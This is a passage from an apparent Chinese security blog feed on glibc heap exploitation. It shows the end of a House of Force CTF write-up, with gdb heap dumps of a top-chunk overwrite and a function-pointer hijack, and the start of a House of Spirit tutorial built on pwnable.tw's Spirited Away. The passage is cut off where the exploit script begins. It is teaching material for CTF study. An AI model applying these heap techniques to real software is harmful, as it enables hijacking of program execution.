class="line">r.recvuntil(<span class="string">"Your choice:"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&#125;"</span>)</div></pre></td></tr></table></figure></p>
<h4 id="3-利用过程"><a href="#3-利用过程" class="headerlink" title="3. 利用过程"></a><strong>3. 利用过程</strong></h4><h5 id="1-添加-item0"><a href="#1-添加-item0" class="headerlink" title="1) 添加 item0"></a><strong>1) 添加 item0</strong></h5><p>添加item0后，堆内存分布如下，0x63000 处的 chunk0 为 box 结构体，结构体中包含 2 个函数指针。0x603020 处的 chunk1 为刚申请用于存放 name 的空间，并且 chunk1 与 top chunk 相邻。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span>&#123;</span></div><div class="line">	<span class="keyword">void</span> (*hello_message)();</div><div class="line">	<span class="keyword">void</span> (*goodbye_message)();</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  <span class="number">0x603000</span></div><div class="line">chunk      <span class="number">0x603000</span>         <span class="number">0x20</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603020</span>         <span class="number">0x50</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603070</span>         <span class="number">0x20f90</span>         (top)</div><div class="line">sbrk_end   <span class="number">0x624000</span></div><div class="line">gdb-peda$ x/<span class="number">20</span>x <span class="number">0x603000</span></div><div class="line"><span class="number">0x603000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span></div><div class="line"><span class="number">0x603010</span>:       <span class="number">0x0000000000400896</span>      <span class="number">0x00000000004008b1</span></div><div class="line"><span class="number">0x603020</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000051</span></div><div class="line"><span class="number">0x603030</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603040</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603050</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603060</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603070</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000020f91</span></div><div class="line"><span class="number">0x603080</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603090</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
<h5 id="2-溢出-name"><a href="#2-溢出-name" class="headerlink" title="2. 溢出 name"></a><strong>2. 溢出 name</strong></h5><p>由于 change_item() 函数中 name 的长度由用户指定，并且程序没有对长度做限制，当指定修改的 name 长度大于 name 的内存大小时，将会导致越界写内存，从而可修改 top chunk 的 size 字段为-1。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  <span class="number">0x603000</span></div><div class="line">chunk      <span class="number">0x603000</span>         <span class="number">0x20</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603020</span>         <span class="number">0x50</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603070</span>         <span class="number">0xfffffffffffffff8</span>(top)</div><div class="line">sbrk_end   <span class="number">0x624000</span></div><div class="line">gdb-peda$ x/<span class="number">20</span>x <span class="number">0x603000</span></div><div class="line"><span class="number">0x603000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span></div><div class="line"><span class="number">0x603010</span>:       <span class="number">0x0000000000400896</span>      <span class="number">0x00000000004008b1</span></div><div class="line"><span class="number">0x603020</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000051</span></div><div class="line"><span class="number">0x603030</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603040</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603050</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603060</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603070</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0xffffffffffffffff</span></div><div class="line"><span class="number">0x603080</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603090</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
<h5 id="3-添加-item1"><a href="#3-添加-item1" class="headerlink" title="3. 添加 item1"></a><strong>3. 添加 item1</strong></h5><p>程序调用 malloc 在 top chunk 中分配一块大内存给 name ，此时更新 top chunk ptr 将会触发整数溢出，从而控制 top chunk 转移到指定内存。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls</div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  <span class="number">0x603000</span></div><div class="line">chunk      <span class="number">0x603000</span>         <span class="number">0x68</span>            (top)</div><div class="line">sbrk_end   <span class="number">0x624000</span></div><div class="line">gdb-peda$ x/<span class="number">20</span>x <span class="number">0x603000</span></div><div class="line"><span class="number">0x603000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000069</span></div><div class="line"><span class="number">0x603010</span>:       <span class="number">0x0000000000400896</span>      <span class="number">0x00000000004008b1</span></div><div class="line"><span class="number">0x603020</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000051</span></div><div class="line"><span class="number">0x603030</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603040</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603050</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603060</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603070</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0xffffffffffffff91</span></div><div class="line"><span class="number">0x603080</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603090</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
<h5 id="4-再次添加-item2"><a href="#4-再次添加-item2" class="headerlink" title="4. 再次添加 item2"></a><strong>4. 再次添加 item2</strong></h5><p>malloc(0x20) 从新的 top chunk 中分配一块内存给 item 的 name，rax 中返回的起始地址为 0x603010，该内存块会包含 box 结构体所在的 chunk。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ heapls                                                                           </div><div class="line">           ADDR             SIZE            STATUS</div><div class="line">sbrk_base  <span class="number">0x603000</span></div><div class="line">chunk      <span class="number">0x603000</span>         <span class="number">0x30</span>            (inuse)</div><div class="line">chunk      <span class="number">0x603030</span>         <span class="number">0x38</span>            (top)</div><div class="line">sbrk_end   <span class="number">0x624000</span></div><div class="line">gdb-peda$ info reg rax</div><div class="line">rax            <span class="number">0x603010</span> <span class="number">0x603010</span></div><div class="line">gdb-peda$ x/<span class="number">20</span>x <span class="number">0x603000</span>                                                                   </div><div class="line"><span class="number">0x603000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000031</span></div><div class="line"><span class="number">0x603010</span>:       <span class="number">0x0000000000400896</span>      <span class="number">0x00000000004008b1</span></div><div class="line"><span class="number">0x603020</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000051</span></div><div class="line"><span class="number">0x603030</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x0000000000000039</span></div><div class="line"><span class="number">0x603040</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603050</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603060</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603070</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00ffffffffffff91</span></div><div class="line"><span class="number">0x603080</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603090</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
<p>之后将 magic 函数地址作为 item2 的 name 写入到新分配的 chunk 中，覆盖 box 结构体中的函数指针，进行劫持程序执行流程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/<span class="number">20</span>x <span class="number">0x603000</span>                                                        </div><div class="line"><span class="number">0x603000</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000031</span></div><div class="line"><span class="number">0x603010</span>:       <span class="number">0x0000000000400d49</span>      <span class="number">0x0000000000400d49</span></div><div class="line"><span class="number">0x603020</span>:       <span class="number">0x000000000000000a</span>      <span class="number">0x0000000000000051</span></div><div class="line"><span class="number">0x603030</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x0000000000000039</span></div><div class="line"><span class="number">0x603040</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603050</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603060</span>:       <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x603070</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00ffffffffffff91</span></div><div class="line"><span class="number">0x603080</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x603090</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></div><div class="line">gdb-peda$ telescope <span class="number">0x400d49</span></div><div class="line"><span class="number">0000</span>| <span class="number">0x400d49</span> (&lt;magic&gt;:        push   rbp)</div><div class="line"><span class="number">0008</span>| <span class="number">0x400d51</span> (&lt;magic+<span class="number">8</span>&gt;:      mov    rax,QWORD PTR fs:<span class="number">0x28</span>)</div><div class="line"><span class="number">0016</span>| <span class="number">0x400d59</span> (&lt;magic+<span class="number">16</span>&gt;:     add    BYTE PTR [rax<span class="number">-0x77</span>],cl)</div><div class="line"><span class="number">0024</span>| <span class="number">0x400d61</span> (&lt;magic+<span class="number">24</span>&gt;:     add    BYTE PTR [rax],al)</div><div class="line"><span class="number">0032</span>| <span class="number">0x400d69</span> (&lt;magic+<span class="number">32</span>&gt;:     add    BYTE PTR [rax+<span class="number">0x0</span>],bh)</div><div class="line"><span class="number">0040</span>| <span class="number">0x400d71</span> (&lt;magic+<span class="number">40</span>&gt;:     stc)</div><div class="line"><span class="number">0048</span>| <span class="number">0x400d79</span> (&lt;magic+<span class="number">48</span>&gt;:     rex.WRB xchg r8,rax)</div><div class="line"><span class="number">0056</span>| <span class="number">0x400d81</span> (&lt;magic+<span class="number">56</span>&gt;:     add    BYTE PTR [rax],al)</div></pre></td></tr></table></figure></p>
<h5 id="5-退出程序"><a href="#5-退出程序" class="headerlink" title="5. 退出程序"></a><strong>5. 退出程序</strong></h5><p>退出程序时会调用 goodbye_message 函数，从而执行 magic 输出 flag。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</div><div class="line">    <span class="string">'5\n'</span></div><div class="line">[DEBUG] Received <span class="number">0xe0</span> bytes:</div><div class="line">    <span class="string">'----------------------------\n'</span></div><div class="line">    <span class="string">'Bamboobox Menu\n'</span></div><div class="line">    <span class="string">'----------------------------\n'</span></div><div class="line">    <span class="string">'1.show the items in the box\n'</span></div><div class="line">    <span class="string">'2.add a new item\n'</span></div><div class="line">    <span class="string">'3.change the item in the box\n'</span></div><div class="line">    <span class="string">'4.remove the item in the box\n'</span></div><div class="line">    <span class="string">'5.exit\n'</span></div><div class="line">    <span class="string">'----------------------------\n'</span></div><div class="line">    <span class="string">'Your choice:'</span></div><div class="line">[DEBUG] Received <span class="number">0x13</span> bytes:</div><div class="line">    <span class="string">'flag&#123;this_is_flag&#125;\n'</span></div><div class="line">flag&#123;this_is_flag&#125;</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="external">The Malloc Maleficarum Glibc Malloc Exploitation Techniques</a><br>[2] <a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="external">House of Force</a><br>[3] <a href="https://github.com/shinmao/WhyNot-HEAP-Exploitation/tree/master/House-Of-Force" target="_blank" rel="external">WhyNot-HEAP-Exploitation</a><br>[4] <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/house_of_force/" target="_blank" rel="external">CTF Wiki-house of force</a><br>[5] <a href="http://veritas501.space/2017/05/23/HITCON-training%20writeup/" target="_blank" rel="external">HITCON-training writeup</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
            <tag> house-of-force </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux glibc heap house-of-spirit]]></title>
      <url>/Linux%20glibc%20heap%20house-of-spirit/</url>
      <content type="html"><![CDATA[<p>House of Spirit 利用方法针对 fastbin 中的 chunk，该方法不修改 chunk 结构中的 metadata，而是直接控制释放 chunk 时传递给 free() 函数的指针，使其指向内存中伪造的 fake chunk，free() 函数执行时会将伪造的 chunk 放入 fastbin 中。当再次申请内存时，会返回伪造的 chunk，接着可对返回的内存写数据。</p>
<h3 id="0x01-释放-fastbin-chunk"><a href="#0x01-释放-fastbin-chunk" class="headerlink" title="0x01 释放 fastbin chunk"></a><strong>0x01 释放 fastbin chunk</strong></h3><h4 id="1-检查标志位"><a href="#1-检查标志位" class="headerlink" title="1) 检查标志位"></a><strong>1) 检查标志位</strong></h4><p>House of Spirit 利用思路是将伪造的 chunk 放入 fastbin 中，下面分析堆管理实现中释放 fastbin chunk 的过程。首先，当释放的 chunk 是由 mmap() 创建时（即 IS_MMAPPED 标志位为 1）会调用 munmap_chunk() 进行释放。而我们希望能调用 _int_free() 函数将 fake chunk 放入 fastbin，因此在伪造 chunk 时要把 IS_MMAPPED 设置为 0。此外把 NON_MAIN_ARENA 标志位也设置为 0。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// malloc.c in glibc2.23</span></div><div class="line"><span class="keyword">void</span> __libc_free (<span class="keyword">void</span> *mem)</div><div class="line">&#123;</div><div class="line">  mstate ar_ptr;</div><div class="line">  mchunkptr p;                          <span class="comment">// chunk corresponding to mem</span></div><div class="line"></div><div class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</div><div class="line">    = atomic_forced_read (__free_hook);</div><div class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</div><div class="line">    &#123;</div><div class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">// free(0) has no effect</span></div><div class="line">    <span class="keyword">return</span>;</div><div class="line"></div><div class="line">  p = mem2chunk (mem);</div><div class="line">  <span class="comment">// 判断是否由 mmap 创建的 chunk</span></div><div class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                <span class="comment">// release mmapped memory.</span></div><div class="line">    &#123;</div><div class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></div><div class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</div><div class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</div><div class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</div><div class="line">        &#123;</div><div class="line">          mp_.mmap_threshold = chunksize (p);</div><div class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</div><div class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</div><div class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</div><div class="line">        &#125;</div><div class="line">      munmap_chunk (p);   <span class="comment">// 调用 munmap_chunk 函数释放</span></div><div class="line">      <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  ar_ptr = arena_for_chunk (p);</div><div class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);   <span class="comment">// 调用 _int_free 函数释放</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="2-检查-size"><a href="#2-检查-size" class="headerlink" title="2) 检查 size"></a><strong>2) 检查 size</strong></h4><p>在 _int_free() 函数中，释放 chunk 时会检查该 chunk 和下一个 chunk 的 size 字段。因此，在伪造 chunk 时应满足以下条件。    </p>
<blockquote>
<p>1） fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值（32bits 系统中为 64 bytes，64 bits 系统中为 128 bytes）。<br>2）fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ（ SIZE_SZ ，32bits 系统中为 4 bytes，64 bits 系统中为 8 bytes），小于 av-&gt;system_mem（132kb，即 0x21000 bytes）。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* malloc.c in glibc2.23 */</span></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock) &#123;</div><div class="line">    mchunkptr       p;           <span class="comment">/* chunk corresponding to mem */</span></div><div class="line">    INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></div><div class="line">    mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></div><div class="line">    ...</div><div class="line">    p = mem2chunk(mem);</div><div class="line">    size = chunksize(p);</div><div class="line">    ...</div><div class="line">    <span class="comment">// fake chunk 的 size 不能超过 fastbin 中 chunk 的最大值</span></div><div class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</div><div class="line">         &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top) &#123;</div><div class="line">      <span class="comment">// fake chunk 下一个 chunk 的 size 要大于 2 * SIZE_SZ，小于 av-&gt;system_mem</span></div><div class="line">      <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">          || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</div><div class="line">          …</div><div class="line">          errstr = <span class="string">"free(): invalid next size (fast)"</span>;</div><div class="line">          <span class="keyword">goto</span> errout;</div><div class="line">        &#125;</div><div class="line">      ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>若伪造的 chunk 能满足以上几个条件，便能成功欺骗 free() 函数把 fake chunk 放入 fastbin 中，当再次申请合适大小的内存时将返回 fake chunk，进而控制目标内存。    </p>
<h3 id="0x2-利用思路"><a href="#0x2-利用思路" class="headerlink" title="0x2 利用思路"></a><strong>0x2 利用思路</strong></h3><p>下面是一个利用场景：程序中存在栈溢出漏洞，溢出长度不足以覆盖栈中返回地址等目标内存，但是能覆盖栈中一个即将被 free 的堆指针 ptr。<br><img src="http://ooyovxue7.bkt.clouddn.com/18-4-12/35769818.jpg" alt="">    </p>
<p>利用思路如下：<br>1）在可控区域 1 中伪造一个 chunk，伪造的 chunk 应满足上述条件，并确保该 chunk 能覆盖目标内存区域；<br>2）为了知道 fake chunk 的地址，需泄露栈地址。之后通过栈溢出等漏洞修改即将释放的堆指针 ptr，使其指向 fake chunk + 2*size_t（prev_size 和 size 字段的大小，32 bits 系统中为 4 bytes，64 bits 系统中为 8 bytes）；<br>3）执行 free(ptr) 释放 ptr，fake chunk 被放入 fastbin 中；<br>4）使用 malloc 申请合适大小的内存，此时将返回刚释放的 fake chunk，使得目标区域可控。    </p>
<h3 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a><strong>0x03 实例分析</strong></h3><p>下面以 pwnable.tw 中的 Spirited Away 为例分析该利用方法。程序和 exp 可在 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/heap_house-of-spirit" target="_blank" rel="external">github</a>下载。   </p>
<h4 id="1）-漏洞"><a href="#1）-漏洞" class="headerlink" title="1） 漏洞"></a><strong>1） 漏洞</strong></h4><p>程序中存在以下两个漏洞：<br>a）缓存区溢出<br>程序中调用 sprintf 函数时存在溢出漏洞，变量 v1 为 56 bytes，当评论数量 cnt 达到 3 位数时会溢出（54+3 &gt; 56），导致其相邻变量 nbytes 被覆盖。利用该漏洞可将 nbytes 修改为 110（“n”的 ASCII 值为 0x6e），由于 nbytes 控制着 name 和 comment 的输入长度，从而又一次产生溢出漏洞。<br>b）信息泄露<br>此外，还存在一个信息泄露漏洞，由于栈中变量 reason 未初始化，输出 reason 时会把栈中数据一起输出。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+10h] [ebp-E8h]   // 56 bytes</span></div><div class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></div><div class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></div><div class="line">  <span class="keyword">char</span> comment; <span class="comment">// [esp+50h] [ebp-A8h]   // 80 bytes</span></div><div class="line">  <span class="keyword">int</span> age; <span class="comment">// [esp+A0h] [ebp-58h]</span></div><div class="line">  <span class="keyword">void</span> *name; <span class="comment">// [esp+A4h] [ebp-54h]   // 指向内存空间为 60 bytes的堆指针</span></div><div class="line">  <span class="keyword">int</span> reason; <span class="comment">// [esp+A8h] [ebp-50h]    // 80 bytes</span></div><div class="line"></div><div class="line">  nbytes = <span class="number">60</span>;    <span class="comment">// 控制name 和 comment的输入长度</span></div><div class="line">  v3 = <span class="number">80</span>;</div><div class="line">LABEL_2:</div><div class="line">  <span class="built_in">memset</span>(&amp;comment, <span class="number">0</span>, <span class="number">80u</span>);   <span class="comment">// reason未初始化</span></div><div class="line">  name = <span class="built_in">malloc</span>(<span class="number">60u</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, name, nbytes);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, &amp;reason, v3);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, &amp;comment, nbytes);</div><div class="line">  ++cnt;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, name);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;reason);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;comment);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);  <span class="comment">// overflow</span></div><div class="line">  <span class="built_in">puts</span>(&amp;v1);</div><div class="line">…</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="2）利用脚本"><a href="#2）利用脚本" class="headerlink" title="2）利用脚本"></a>2）<strong>利用脚本</strong></h4><p>完整的利用脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div 